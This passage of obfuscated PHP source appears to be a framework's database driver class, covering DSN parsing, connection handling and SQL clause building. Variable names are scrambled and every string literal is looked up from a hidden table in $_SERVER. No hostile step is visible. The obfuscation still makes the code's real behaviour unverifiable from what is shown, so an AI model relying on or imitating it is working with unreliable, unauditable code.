(empty($ÜÌµæ¥Ù[$ßŸüâÄ°[1072]])) { think_exception(think_lang($ßŸüâÄ°[1073])); } $this->dbType = ucwords(strtolower($ÜÌµæ¥Ù[$ßŸüâÄ°[1072]])); $¹©ùïòè = $ßŸüâÄ°[1074] . $this->dbType; if (class_exists($¹©ùïòè)) { $òÊú¥Åã = new $¹©ùïòè($ÜÌµæ¥Ù); if ($ßŸüâÄ°[1075] != strtolower($ÜÌµæ¥Ù[$ßŸüâÄ°[1072]])) { $òÊú¥Åã->dbType = strtoupper($this->dbType); } else { $òÊú¥Åã->dbType = $this->_getDsnType($ÜÌµæ¥Ù[$ßŸüâÄ°[1027]]); } } else { think_exception(think_lang($ßŸüâÄ°[1076]) . $ßŸüâÄ°[1077] . $¹©ùïòè); } return $òÊú¥Åã; } public function __call($â©Ñê×ğ, $«ŞòêúÙ) { if (method_exists($this, $â©Ñê×ğ)) { return call_user_func_array(array($this, $â©Ñê×ğ), $«ŞòêúÙ); } } protected function _getDsnType($ğÌË‰ö¹) { $—ÖËÑÄš = explode($_SERVER[ŒÅŸ‹ä†][4], $ğÌË‰ö¹); $—½ºşŞÀ = strtoupper(trim($—ÖËÑÄš[0])); return $—½ºşŞÀ; } private function parseConfig($¸§ÎóÁù = '') { $á¦ˆñÇê =& $_SERVER[ŒÅŸ‹ä†]; if (!empty($¸§ÎóÁù) && is_string($¸§ÎóÁù)) { $¸§ÎóÁù = $this->parseDSN($¸§ÎóÁù); } elseif (is_array($¸§ÎóÁù)) { $¸§ÎóÁù = array_change_key_case($¸§ÎóÁù); $¸§ÎóÁù = array($á¦ˆñÇê[1072] => $¸§ÎóÁù[$á¦ˆñÇê[1078]], $á¦ˆñÇê[996] => $¸§ÎóÁù[$á¦ˆñÇê[1079]], $á¦ˆñÇê[997] => $¸§ÎóÁù[$á¦ˆñÇê[1080]], $á¦ˆñÇê[994] => $¸§ÎóÁù[$á¦ˆñÇê[1081]], $á¦ˆñÇê[995] => $¸§ÎóÁù[$á¦ˆñÇê[1082]], $á¦ˆñÇê[31] => $¸§ÎóÁù[$á¦ˆñÇê[1083]], $á¦ˆñÇê[1027] => $¸§ÎóÁù[$á¦ˆñÇê[1084]], $á¦ˆñÇê[27] => isset($¸§ÎóÁù[$á¦ˆñÇê[1085]]) ? $¸§ÎóÁù[$á¦ˆñÇê[1085]] : array()); } elseif (empty($¸§ÎóÁù)) { if (think_config($á¦ˆñÇê[1086]) && $á¦ˆñÇê[1075] != strtolower(think_config($á¦ˆñÇê[1087]))) { $¸§ÎóÁù = $this->parseDSN(think_config($á¦ˆñÇê[1086])); } else { $¸§ÎóÁù = array($á¦ˆñÇê[1072] => think_config($á¦ˆñÇê[1087]), $á¦ˆñÇê[996] => think_config($á¦ˆñÇê[1088]), $á¦ˆñÇê[997] => think_config($á¦ˆñÇê[1089]), $á¦ˆñÇê[994] => think_config($á¦ˆñÇê[1090]), $á¦ˆñÇê[995] => think_config($á¦ˆñÇê[1091]), $á¦ˆñÇê[31] => think_config($á¦ˆñÇê[333]), $á¦ˆñÇê[1027] => think_config($á¦ˆñÇê[1086]), $á¦ˆñÇê[27] => think_config($á¦ˆñÇê[1092])); } } return $¸§ÎóÁù; } protected function initConnect($î»±²Œö = true) { if (1 == think_config($_SERVER[ŒÅŸ‹ä†][32])) { $this->_linkID = $this->multiConnect($î»±²Œö); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $‹èı¯ƒ‹ => $ïÜ·Ñ“¿) { $this->_linkID = $ïÜ·Ñ“¿; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($“”ü¬ğœ = false) { $ùÏÖ¶Ö =& $_SERVER[ŒÅŸ‹ä†]; static $îòšíÕ§ = array(); static $Öóş­·Õ = -1; if (empty($îòšíÕ§)) { foreach ($this->config as $­Œáçß² => $Œ·¦ÑÎ²) { $îòšíÕ§[$­Œáçß²] = explode($ùÏÖ¶Ö[60], $Œ·¦ÑÎ²); } } if (think_config($ùÏÖ¶Ö[1093])) { if ($“”ü¬ğœ || think_config($ùÏÖ¶Ö[491]) === !0) { $ïÂ—ŠêÕ = floor(mt_rand(0, think_config($ùÏÖ¶Ö[1094]) - 1)); $Öóş­·Õ = $ïÂ—ŠêÕ; } else { if (is_numeric(think_config($ùÏÖ¶Ö[1095]))) { $ïÂ—ŠêÕ = think_config($ùÏÖ¶Ö[1095]); } else { $ïÂ—ŠêÕ = floor(mt_rand(think_config($ùÏÖ¶Ö[1094]), count($îòšíÕ§[$ùÏÖ¶Ö[994]]) - 1)); } } } else { $ïÂ—ŠêÕ = floor(mt_rand(0, count($îòšíÕ§[$ùÏÖ¶Ö[994]]) - 1)); $Öóş­·Õ = $ïÂ—ŠêÕ; } $ïÂ—ŠêÕ = $Öóş­·Õ !== -1 ? $Öóş­·Õ : $ïÂ—ŠêÕ; $ùë€ß¹ = array($ùÏÖ¶Ö[996] => isset($îòšíÕ§[$ùÏÖ¶Ö[996]][$ïÂ—ŠêÕ]) ? $îòšíÕ§[$ùÏÖ¶Ö[996]][$ïÂ—ŠêÕ] : $îòšíÕ§[$ùÏÖ¶Ö[996]][0], $ùÏÖ¶Ö[997] => isset($îòšíÕ§[$ùÏÖ¶Ö[997]][$ïÂ—ŠêÕ]) ? $îòšíÕ§[$ùÏÖ¶Ö[997]][$ïÂ—ŠêÕ] : $îòšíÕ§[$ùÏÖ¶Ö[997]][0], $ùÏÖ¶Ö[994] => isset($îòšíÕ§[$ùÏÖ¶Ö[994]][$ïÂ—ŠêÕ]) ? $îòšíÕ§[$ùÏÖ¶Ö[994]][$ïÂ—ŠêÕ] : $îòšíÕ§[$ùÏÖ¶Ö[994]][0], $ùÏÖ¶Ö[995] => isset($îòšíÕ§[$ùÏÖ¶Ö[995]][$ïÂ—ŠêÕ]) ? $îòšíÕ§[$ùÏÖ¶Ö[995]][$ïÂ—ŠêÕ] : $îòšíÕ§[$ùÏÖ¶Ö[995]][0], $ùÏÖ¶Ö[31] => isset($îòšíÕ§[$ùÏÖ¶Ö[31]][$ïÂ—ŠêÕ]) ? $îòšíÕ§[$ùÏÖ¶Ö[31]][$ïÂ—ŠêÕ] : $îòšíÕ§[$ùÏÖ¶Ö[31]][0], $ùÏÖ¶Ö[1027] => isset($îòšíÕ§[$ùÏÖ¶Ö[1027]][$ïÂ—ŠêÕ]) ? $îòšíÕ§[$ùÏÖ¶Ö[1027]][$ïÂ—ŠêÕ] : $îòšíÕ§[$ùÏÖ¶Ö[1027]][0], $ùÏÖ¶Ö[27] => isset($îòšíÕ§[$ùÏÖ¶Ö[27]][$ïÂ—ŠêÕ]) ? $îòšíÕ§[$ùÏÖ¶Ö[27]][$ïÂ—ŠêÕ] : $îòšíÕ§[$ùÏÖ¶Ö[27]][0]); return $this->connect($ùë€ß¹, $ïÂ—ŠêÕ); } public function parseDSN($ªõÁ¸’‚) { $•ßôòœØ =& $_SERVER[ŒÅŸ‹ä†]; if (empty($ªõÁ¸’‚)) { return !1; } $Ã‹¬Ñƒ = parse_url($ªõÁ¸’‚); if ($Ã‹¬Ñƒ[$•ßôòœØ[216]]) { $”¾õı™‚ = array($•ßôòœØ[1072] => $Ã‹¬Ñƒ[$•ßôòœØ[216]], $•ßôòœØ[996] => isset($Ã‹¬Ñƒ[$•ßôòœØ[690]]) ? $Ã‹¬Ñƒ[$•ßôòœØ[690]] : $•ßôòœØ[12], $•ßôòœØ[997] => isset($Ã‹¬Ñƒ[$•ßôòœØ[1096]]) ? $Ã‹¬Ñƒ[$•ßôòœØ[1096]] : $•ßôòœØ[12], $•ßôòœØ[994] => isset($Ã‹¬Ñƒ[$•ßôòœØ[217]]) ? $Ã‹¬Ñƒ[$•ßôòœØ[217]] : $•ßôòœØ[12], $•ßôòœØ[995] => isset($Ã‹¬Ñƒ[$•ßôòœØ[218]]) ? $Ã‹¬Ñƒ[$•ßôòœØ[218]] : $•ßôòœØ[12], $•ßôòœØ[31] => isset($Ã‹¬Ñƒ[$•ßôòœØ[97]]) ? substr($Ã‹¬Ñƒ[$•ßôòœØ[97]], 1) : $•ßôòœØ[12]); } else { preg_match($•ßôòœØ[1097], trim($ªõÁ¸’‚), $ŸˆÎ²äó); $”¾õı™‚ = array($•ßôòœØ[1072] => $ŸˆÎ²äó[1], $•ßôòœØ[996] => $ŸˆÎ²äó[2], $•ßôòœØ[997] => $ŸˆÎ²äó[3], $•ßôòœØ[994] => $ŸˆÎ²äó[4], $•ßôòœØ[995] => $ŸˆÎ²äó[5], $•ßôòœØ[31] => $ŸˆÎ²äó[6]); } $”¾õı™‚[$•ßôòœØ[1027]] = $•ßôòœØ[12]; return $”¾õı™‚; } protected function debug() { $œ‘üÌ«ç =& $_SERVER[ŒÅŸ‹ä†]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $œ‘üÌ«ç[1098]; if (think_config($œ‘üÌ«ç[1099])) { think_status($œ‘üÌ«ç[1100]); think_trace($this->queryStr . $œ‘üÌ«ç[1101] . think_status($œ‘üÌ«ç[34], $œ‘üÌ«ç[1100], 6) . $œ‘üÌ«ç[1102], $œ‘üÌ«ç[12], $œ‘üÌ«ç[1103]); } } protected function parseLock($ó¢´•¤˜ = false) { $ñÄ¥É‰ =& $_SERVER[ŒÅŸ‹ä†]; if (!$ó¢´•¤˜) { return $ñÄ¥É‰[12]; } if ($ñÄ¥É‰[1029] == $this->dbType) { return $ñÄ¥É‰[1104]; } return $ñÄ¥É‰[1105]; } protected function parseSet($èœ‘ã—±) { $œšÒÒºö =& $_SERVER[ŒÅŸ‹ä†]; foreach ($èœ‘ã—± as $ö¢ŠÁ¶å => $Æí”ŠÁ¨) { if (is_array($Æí”ŠÁ¨) && $œšÒÒºö[382] == $Æí”ŠÁ¨[0]) { $õå§×Ä[] = $this->parseKey($ö¢ŠÁ¶å) . $œšÒÒºö[473] . $Æí”ŠÁ¨[1]; } elseif (is_scalar($Æí”ŠÁ¨) || is_null($Æí”ŠÁ¨)) { $õå§×Ä[] = $this->parseKey($ö¢ŠÁ¶å) . $œšÒÒºö[473] . $this->parseValue($Æí”ŠÁ¨); } } return $œšÒÒºö[1106] . implode($œšÒÒºö[60], $õå§×Ä); } protected function bindParam($¸ßªË¨À, $Š·…ì“¯) { $this->bind[$_SERVER[ŒÅŸ‹ä†][4] . $¸ßªË¨À] = $Š·…ì“¯; } protected function parseBind($º¸ä¥¬) { $º¸ä¥¬ = array_merge($this->bind, $º¸ä¥¬); $this->bind = array(); return $º¸ä¥¬; } function parseKey(&$Ç´©¦·Ú, $Îèì± = true) { if ($Îèì±) { $Ç´©¦·Ú = $this->parseKeyCheck($Ç´©¦·Ú); } return $Ç´©¦·Ú; } function parseKeyCheck($©ÈºÅµ) { $˜ıÛä =& $_SERVER[ŒÅŸ‹ä†]; $©ÈºÅµ = trim($©ÈºÅµ); if (!preg_match($˜ıÛä[1107], $©ÈºÅµ)) { think_exception($˜ıÛä[1108] . $©ÈºÅµ); } return $©ÈºÅµ; } protected function parseValue($àû€Åü±) { $¬¡”†îâ =& $_SERVER[ŒÅŸ‹ä†]; if (is_string($àû€Åü±)) { $àû€Åü± = $¬¡”†îâ[1068] . $this->escapeString($àû€Åü±) . $¬¡”†îâ[1068]; } elseif (isset($àû€Åü±[0]) && is_string($àû€Åü±[0]) && strtolower($àû€Åü±[0]) == $¬¡”†îâ[382]) { $àû€Åü± = $this->escapeString($àû€Åü±[1]); } elseif (is_array($àû€Åü±)) { $àû€Åü± = array_map(array($this, $¬¡”†îâ[1069]), $àû€Åü±); } elseif (is_bool($àû€Åü±)) { $àû€Åü± = $àû€Åü± ? $¬¡”†îâ[101] : $¬¡”†îâ[239]; } elseif (is_null($àû€Åü±)) { $àû€Åü± = $¬¡”†îâ[114]; } return $àû€Åü±; } protected function parseField($è—¤Ç™ë) { $é¥›şœ =& $_SERVER[ŒÅŸ‹ä†]; if (is_string($è—¤Ç™ë) && strpos($è—¤Ç™ë, $é¥›şœ[60])) { $è—¤Ç™ë = explode($é¥›şœ[60], $è—¤Ç™ë); } if (is_array($è—¤Ç™ë)) { $öĞ´²ŞÅ = array(); foreach ($è—¤Ç™ë as $ËäÀÅ¤µ => $°÷¦ŸşÉ) { if (!is_numeric($ËäÀÅ¤µ)) { $öĞ´²ŞÅ[] = $this->parseKey($ËäÀÅ¤µ, !1) . $é¥›şœ[1109] . $this->parseKey($°÷¦ŸşÉ); } else { $öĞ´²ŞÅ[] = $this->parseKey($°÷¦ŸşÉ); } } $ÉüÏ½Ô« = implode($é¥›şœ[60], $öĞ´²ŞÅ); } elseif (is_string($è—¤Ç™ë) && !empty($è—¤Ç™ë)) { $ÉüÏ½Ô« = $è—¤Ç™ë; } else { $ÉüÏ½Ô« = $é¥›şœ[231]; } return $ÉüÏ½Ô«; } protected function parseTable($îÇ¼¢ÑÌ) { $İèĞÓìù =& $_SERVER[ŒÅŸ‹ä†]; if (is_array($îÇ¼¢ÑÌ)) { $Ğò·Ÿ¹è = array(); foreach ($îÇ¼¢ÑÌ as $ß¥ÍÓ¬Î => $Íˆ³òü¶) { if (!is_numeric($ß¥ÍÓ¬Î)) { $Ğò·Ÿ¹è[] = $this->parseKey($ß¥ÍÓ¬Î) . $İèĞÓìù[63] . $this->parseKey($Íˆ³òü¶); } else { $Ğò·Ÿ¹è[] = $this->parseKey($ß¥ÍÓ¬Î); } } $îÇ¼¢ÑÌ = $Ğò·Ÿ¹è; } elseif (is_string($îÇ¼¢ÑÌ)) { if (strstr($îÇ¼¢ÑÌ, $İèĞÓìù[63])) { return $îÇ¼¢ÑÌ; } $îÇ¼¢ÑÌ = explode($İèĞÓìù[60], $îÇ¼¢ÑÌ); array_walk($îÇ¼¢ÑÌ, array($this, $İèĞÓìù[1014])); } return $İèĞÓìù[1008] . trim(implode($İèĞÓìù[1110], $îÇ¼¢ÑÌ), $İèĞÓìù[481]) . $İèĞÓìù[1008]; } protected function parseWhere($şšùâŞ) { $¨™õ¢õ˜ =& $_SERVER[ŒÅŸ‹ä†]; $°´É€ = $¨™õ¢õ˜[12]; if (is_string($şšùâŞ)) { $°´É€ = $şšùâŞ; } else { $®ú¡ÁÃ˜ = isset($şšùâŞ[$¨™õ¢õ˜[1111]]) ? strtoupper($şšùâŞ[$¨™õ¢õ˜[1111]]) : $¨™õ¢õ˜[12]; if (in_array($®ú¡ÁÃ˜, array($¨™õ¢õ˜[1112], $¨™õ¢õ˜[1113], $¨™õ¢õ˜[1114]))) { $®ú¡ÁÃ˜ = $¨™õ¢õ˜[63] . $®ú¡ÁÃ˜ . $¨™õ¢õ˜[63]; unset($şšùâŞ[$¨™õ¢õ˜[1111]]); } else { $®ú¡ÁÃ˜ = $¨™õ¢õ˜[1115]; } foreach ($şšùâŞ as $ÅÊµ×ì => $©®Ö•Î) { $°´É€ .= $¨™õ¢õ˜[365]; if (is_numeric($ÅÊµ×ì)) { $ÅÊµ×ì = $¨™õ¢õ˜[1116]; } if (0 === strpos($ÅÊµ×ì, $¨™õ¢õ˜[11])) { $°´É€ .= $this->parseThinkWhere($ÅÊµ×ì, $©®Ö•Î); } else { if (!preg_match($¨™õ¢õ˜[1117], trim($ÅÊµ×ì))) { think_exception(think_lang($¨™õ¢õ˜[1118]) . $¨™õ¢õ˜[4] . $ÅÊµ×ì); } $‚¿’Î²Ğ = is_array($©®Ö•Î) && isset($©®Ö•Î[$¨™õ¢õ˜[1119]]); $ÅÊµ×ì = trim($ÅÊµ×ì); if (strpos($ÅÊµ×ì, $¨™õ¢õ˜[223])) { $©³òÂ¥Æ = explode($¨™õ¢õ˜[223], $ÅÊµ×ì); $ÅÅ‹†Ï¦ = array(); foreach ($©³òÂ¥Æ as $ÇÕÒ·”Ì => $Ùå¬©Ä) { $ğÌ‡×ñã = $‚¿’Î²Ğ ? $©®Ö•Î[$ÇÕÒ·”Ì] : $©®Ö•Î; $ÅÅ‹†Ï¦[] = $¨™õ¢õ˜[347] . $this->parseWhereItem($this->parseKey($Ùå¬©Ä), $ğÌ‡×ñã) . $¨™õ¢õ˜[1013]; } $°´É€ .= implode($¨™õ¢õ˜[1120], $ÅÅ‹†Ï¦); } elseif (strpos($ÅÊµ×ì, $¨™õ¢õ˜[295])) { $©³òÂ¥Æ = explode($¨™õ¢õ˜[295], $ÅÊµ×ì); $ÅÅ‹†Ï¦ = array(); foreach ($©³òÂ¥Æ as $ÇÕÒ·”Ì => $Ùå¬©Ä) { $ğÌ‡×ñã = $‚¿’Î²Ğ ? $©®Ö•Î[$ÇÕÒ·”Ì] : $©®Ö•Î; $ÅÅ‹†Ï¦[] = $¨™õ¢õ˜[347] . $this->parseWhereItem($this->parseKey($Ùå¬©Ä), $ğÌ‡×ñã) . $¨™õ¢õ˜[1013]; } $°´É€ .= implode($¨™õ¢õ˜[1115], $ÅÅ‹†Ï¦); } else { $°´É€ .= $this->parseWhereItem($this->parseKey($ÅÊµ×ì), $©®Ö•Î); } } $°´É€ .= $¨™õ¢õ˜[366] . $®ú¡ÁÃ˜; } $°´É€ = substr($°´É€, 0, -strlen($®ú¡ÁÃ˜)); } return empty($°´É€) ? $¨™õ¢õ˜[12] : $¨™õ¢õ˜[1121] . $°´É€; } protected function parseWhereItem($Äñò‘×, $Ôûî„Îö) { $À“®’Â =& $_SERVER[ŒÅŸ‹ä†]; $úğ¬¹¯‘ = $À“®’Â[12]; if (is_array($Ôûî„Îö)) { if (is_string($Ôûî„Îö[0])) { $¤»ôÔ = strtolower($Ôûî„Îö[0]); if (in_array($Ôûî„Îö[0], array($À“®’Â[473], $À“®’Â[1122], $À“®’Â[1123], $À“®’Â[1124], $À“®’Â[1125], $À“®’Â[1126]))) { $úğ¬¹¯‘ .= $Äñò‘× . $À“®’Â[63] . $Ôûî„Îö[0] . $À“®’Â[63] . $this->parseValue($Ôûî„Îö[1]); } elseif (preg_match($À“®’Â[1127], $Ôûî„Îö[0])) { $úğ¬¹¯‘ .= $Äñò‘× . $À“®’Â[63] . $this->exp[$¤»ôÔ] . $À“®’Â[63] . $this->parseValue($Ôûî„Îö[1]); } elseif (preg_match($À“®’Â[1128], $Ôûî„Îö[0])) { if (is_array($Ôûî„Îö[1])) { $ ¿½¾ßÚ = isset($Ôûî„Îö[2]) ? strtoupper($Ôûî„Îö[2]) : $À“®’Â[1113]; if (in_array($ ¿½¾ßÚ, array($À“®’Â[1112], $À“®’Â[1113], $À“®’Â[1114]))) { $â…¯À´» = array(); foreach ($Ôûî„Îö[1] as $Îçƒˆåı) { $â…¯À´»[] = $Äñò‘× . $À“®’Â[63] . $this->exp[$¤»ôÔ] . $À“®’Â[63] . $this->parseValue($Îçƒˆåı); } $úğ¬¹¯‘ .= $À“®’Â[347] . implode($À“®’Â[63] . $ ¿½¾ßÚ . $À“®’Â[63], $â…¯À´») . $À“®’Â[1013]; } } else { $úğ¬¹¯‘ .= $Äñò‘× . $À“®’Â[63] . $this->exp[$¤»ôÔ] . $À“®’Â[63] . $this->parseValue($Ôûî„Îö[1]); } } elseif ($À“®’Â[382] == $¤»ôÔ) { $úğ¬¹¯‘ .= $À“®’Â[1011] . $Äñò‘× . $À“®’Â[63] . $Ôûî„Îö[1] . $À“®’Â[1129]; } elseif (preg_match($À“®’Â[1130], $Ôûî„Îö[0])) { $úğ¬¹¯‘ .= $Ôûî„Îö[0]; } elseif (preg_match($À“®’Â[1131], $Ôûî„Îö[0])) { if (isset($Ôûî„Îö[2]) && $À“®’Â[382] == $Ôûî„Îö[2]) { $úğ¬¹¯‘ .= $Äñò‘× . $À“®’Â[63] . $this->exp[$¤»ôÔ] . $À“®’Â[63] . $Ôûî„Îö[1]; } else { if (is_string($Ôûî„Îö[1])) { $Ôûî„Îö[1] = explode($À“®’Â[60], $Ôûî„Îö[1]); } $Ö·Ö¸à› = implode($À“®’Â[60], $this->parseValue($Ôûî„Îö[1])); $úğ¬¹¯‘ .= $Äñò‘× . $À“®’Â[63] . $this->exp[$¤»ôÔ] . $À“®’Â[1011] . $Ö·Ö¸à› . $À“®’Â[1013]; } } elseif (preg_match($À“®’Â[1132], $Ôûî„Îö[0])) { $¶Ñ˜¸—µ = is_string($Ôûî„Îö[1]) ? explode($À“®’Â[60], $Ôûî„Îö[1]) : $Ôûî„Îö[1]; $úğ¬¹¯‘ .= $À“®’Â[1011] . $Äñò‘× . $À“®’Â[63] . $this->exp[$¤»ôÔ] . $À“®’Â[63] . $this->parseValue($¶Ñ˜¸—µ[0]) . $À“®’Â[1115] . $this->parseValue($¶Ñ˜¸—µ[1]) . $À“®’Â[366]; } else { think_exception(think_lang($À“®’Â[1118]) . $À“®’Â[4] . $Ôûî„Îö[0]); } } else { $ ‡¥¸÷ñ = count($Ôûî„Îö); $¢–®•ªÑ = $À“®’Â[12]; if (is_string($Ôûî„Îö[$ ‡¥¸÷ñ - 1])) { $¢–®•ªÑ = isset($Ôûî„Îö[$ ‡¥¸÷ñ - 1]) ? strtoupper($Ôûî„Îö[$ ‡¥¸÷ñ - 1]) : $À“®’Â[12]; if (in_array($¢–®•ªÑ, array($À“®’Â[1112], $À“®’Â[1113], $À“®’Â[1114]))) { $ ‡¥¸÷ñ = $ ‡¥¸÷ñ - 1; } } else { $¢–®•ªÑ = $À“®’Â[1112]; } for ($©Š†›€Ñ = 0; $©Š†›€Ñ < $ ‡¥¸÷ñ; $©Š†›€Ñ++) { $¶Ñ˜¸—µ = is_array($Ôûî„Îö[$©Š†›€Ñ]) ? $Ôûî„Îö[$©Š†›€Ñ][1] : $Ôûî„Îö[$©Š†›€Ñ]; if ($À“®’Â[382] == strtolower($Ôûî„Îö[$©Š†›€Ñ][0])) { $úğ¬¹¯‘ .= $À“®’Â[347] . $Äñò‘× . $À“®’Â[63] . $¶Ñ˜¸—µ . $À“®’Â[1129] . $¢–®•ªÑ . $À“®’Â[63]; } else { $İ‚ëºÁÜ = is_array($Ôûî„Îö[$©Š†›€Ñ]) ? $this->exp[strtolower($Ôûî„Îö[$©Š†›€Ñ][0])] : $À“®’Â[473]; if (!$İ‚ëºÁÜ && is_array($Ôûî„Îö[$©Š†›€Ñ]) && in_array($Ôûî„Îö[$©Š†›€Ñ][0], array($À“®’Â[473], $À“®’Â[1122], $À“®’Â[1123], $À“®’Â[1124], $À“®’Â[1125], $À“®’Â[1126]))) { $İ‚ëºÁÜ = $Ôûî„Îö[$©Š†›€Ñ][0]; } $úğ¬¹¯‘ .= $À“®’Â[347] . $Äñò‘× . $À“®’Â[63] . $İ‚ëºÁÜ . $À“®’Â[63] . $this->parseValue($¶Ñ˜¸—µ) . $À“®’Â[1129] . $¢–®•ªÑ . $À“®’Â[63]; } } $úğ¬¹¯‘ = substr($úğ¬¹¯‘, 0, -4); } } else { $úğ¬¹¯‘ .= $Äñò‘× . $À“®’Â[1133] . $this->parseValue($Ôûî„Îö); } return $úğ¬¹¯‘; } protected function parseThinkWhere($«³âª¥, $½ı®ôö) { $şöú…Ô· =& $_SERVER[ŒÅŸ‹ä†]; $¦É³üÒ = $şöú…Ô·[12]; switch ($«³âª¥) { case $şöú…Ô·[437]: $¦É³üÒ = $½ı®ôö; break; case $şöú…Ô·[1116]: $¦É³üÒ = is_string($½ı®ôö) ? $½ı®ôö : substr($this->parseWhere($½ı®ôö), 6); break; case $şöú…Ô·[1134]: parse_str($½ı®ôö, $µ×•ş­); if (isset($µ×•ş­[$şöú…Ô·[1111]])) { $Ÿ¡ÂÎïÅ = $şöú…Ô·[63] . strtoupper($µ×•ş­[$şöú…Ô·[1111]]) . $şöú…Ô·[63]; unset($µ×•ş­[$şöú…Ô·[1111]]); } else { $Ÿ¡ÂÎïÅ = $şöú…Ô·[1115]; } $Ğ×†’´å = array(); foreach ($µ×•ş­ as $Ï¦è°ö× => $Ø‚ ß‡š) { $Ğ×†’´å[] = $this->parseKey($Ï¦è°ö×) . $şöú…Ô·[1133] . $this->parseValue($Ø‚ ß‡š); } $¦É³üÒ = implode($Ÿ¡ÂÎïÅ, $Ğ×†’´å); break; } return $¦É³üÒ; } protected function parseLimit($–Ôìû³€) { $½‹·à„¾ =& $_SERVER[ŒÅŸ‹ä†]; return !empty($–Ôìû³€) ? $½‹·à„¾[61] . $–Ôìû³€ . $½‹·à„¾[63] : $½‹·à„¾[12]; } protected function parseJoin($û¨øŠß‚) { $ê£ÑË… =& $_SERVER[ŒÅŸ‹ä†]; $Îöüˆöï = $ê£ÑË…[12]; if (!empty($û¨øŠß‚)) { if (is_array($û¨øŠß‚)) { foreach ($û¨øŠß‚ as $Œ•‰¾âÆ => $ßéìõïà) { if (!1 !== stripos($ßéìõïà, $ê£ÑË…[1135])) { $Îöüˆöï .= $ê£ÑË…[63] . $ßéìõïà; } else { $Îöüˆöï .= $ê£ÑË…[1136] . $ßéìõïà; } } } else { $Îöüˆöï .= $ê£ÑË…[1136] . $û¨øŠß‚; } } $Îöüˆöï = preg_replace($ê£ÑË…[1137], think_config($ê£ÑË…[1041]) . $ê£ÑË…[1138], $Îöüˆöï); return $Îöüˆöï; } protected function parseOrder($Óë†è¡) { $ÀšĞ¿³ =& $_SERVER[ŒÅŸ‹ä†]; if (is_array($Óë†è¡)) { $¡ÑãšºĞ = array(); foreach ($Óë†è¡ as $öÙî°½ä => $Ò­˜—•ó) { if (is_numeric($öÙî°½ä)) { $¡ÑãšºĞ[] = $this->parseKey($Ò­˜—•ó); } else { $Ò­˜—•ó = in_array(strtoupper(trim($Ò­˜—•ó)), array($ÀšĞ¿³[1139], $ÀšĞ¿³[1140])) ? $ÀšĞ¿³[63] . $Ò­˜—•ó : $ÀšĞ¿³[12]; if (preg_match($ÀšĞ¿³[1141], $öÙî°½ä)) { $¡ÑãšºĞ[] = $this->parseKey($öÙî°½ä) . $Ò­˜—•ó; } else { think_exception($ÀšĞ¿³[1142] . $öÙî°½ä); } } } $Óë†è¡ = implode($ÀšĞ¿³[60], $¡ÑãšºĞ); } return !empty($Óë†è¡) ? $ÀšĞ¿³[1143] . $Óë†è¡ : $ÀšĞ¿³[12]; } protected function parseGroup($¾ö„Õ’) { $©¥·ãÍ’ =& $_SERVER[ŒÅŸ‹ä†]; return !empty($¾ö„Õ’) ? $©¥·ãÍ’[1144] . $¾ö„Õ’ : $©¥·ãÍ’[12]; } protected function parseHaving($Èä¯ö³§) { $¹Ï¥¤ÑÆ =& $_SERVER[ŒÅŸ‹ä†]; return !empty($Èä¯ö³§) ? $¹Ï¥¤ÑÆ[1145] . $Èä¯ö³§ : $¹Ï¥¤ÑÆ[12]; } protected function parseComment($ÂàŠõì) { $¬äíÄ˜´ =& $_SERVER[ŒÅŸ‹ä†]; return !empty($ÂàŠõì) ? $¬äíÄ˜´[1146] . $ÂàŠõì . $¬äíÄ˜´[1147] : $¬äíÄ˜´[12]; } protected function parseDistinct($ûñ½Ş) { $§“ìû³› =& $_SERVER[ŒÅŸ‹ä†]; return !empty($ûñ½Ş) ? $§“ìû³›[1148] : $§“ìû³›[12]; } protected function parseUnion($£æáÑëö) { $ËÄÌœ•ß =& $_SERVER[ŒÅŸ‹ä†]; if (empty($£æáÑëö)) { return $ËÄÌœ•ß[12]; } if (isset($£æáÑëö[$ËÄÌœ•ß[433]])) { $ ÛÁÒÍ = $ËÄÌœ•ß[1149]; unset($£æáÑëö[$ËÄÌœ•ß[433]]); } else { $ ÛÁÒÍ = $ËÄÌœ•ß[1150]; } foreach ($£æáÑëö as $¼™°«ïÁ) { $ÓŞë›²[] = $ ÛÁÒÍ . (is_array($¼™°«ïÁ) ? $this->buildSelectSql($¼™°«ïÁ) : $¼™°«ïÁ); } return implode($ËÄÌœ•ß[63], $ÓŞë›²); } public function insert($ıæÔù¨¥, $´ó¶Ö›¹ = array(), $°°ó°ú = false) { $Ã¦üç–î =& $_SERVER[ŒÅŸ‹ä†]; $¾¤Îä© = $Åâá±©² = array(); $this->model = $´ó¶Ö›¹[$Ã¦üç–î[369]]; foreach ($ıæÔù¨¥ as $¯¨® => $Åºİ–°€) { if (is_array($Åºİ–°€) && $Ã¦üç–î[382] == $Åºİ–°€[0]) { $Åâá±©²[] = $this->parseKey($¯¨®); $¾¤Îä©[] = $Åºİ–°€[1]; } elseif (is_scalar($Åºİ–°€) || is_null($Åºİ–°€)) { $Åâá±©²[] = $this->parseKey($¯¨®); $¾¤Îä©[] = $this->parseValue($Åºİ–°€); } } $²—Ö“æÛ = ($°°ó°ú ? $Ã¦üç–î[1015] : $Ã¦üç–î[1016]) . $Ã¦üç–î[1017] . $this->parseTable($´ó¶Ö›¹[$Ã¦üç–î[367]]) . $Ã¦üç–î[1011] . implode($Ã¦üç–î[60], $Åâá±©²) . $Ã¦üç–î[1012] . implode($Ã¦üç–î[60], $¾¤Îä©) . $Ã¦üç–î[1013]; $²—Ö“æÛ .= $this->parseLock(isset($´ó¶Ö›¹[$Ã¦üç–î[951]]) ? $´ó¶Ö›¹[$Ã¦üç–î[951]] : !1); $²—Ö“æÛ .= $this->parseComment(!empty($´ó¶Ö›¹[$Ã¦üç–î[439]]) ? $´ó¶Ö›¹[$Ã¦üç–î[439]] : $Ã¦üç–î[12]); return $this->execute($²—Ö“æÛ, $this->parseBind(!empty($´ó¶Ö›¹[$Ã¦üç–î[371]]) ? $´ó¶Ö›¹[$Ã¦üç–î[371]] : array())); } public function selectInsert($İ‘ã¼Ô, $€éú‹“‚, $ìªÒºÉ = array()) { $ë¸…¹…İ =& $_SERVER[ŒÅŸ‹ä†]; $this->model = $ìªÒºÉ[$ë¸…¹…İ[369]]; if (is_string($İ‘ã¼Ô)) { $İ‘ã¼Ô = 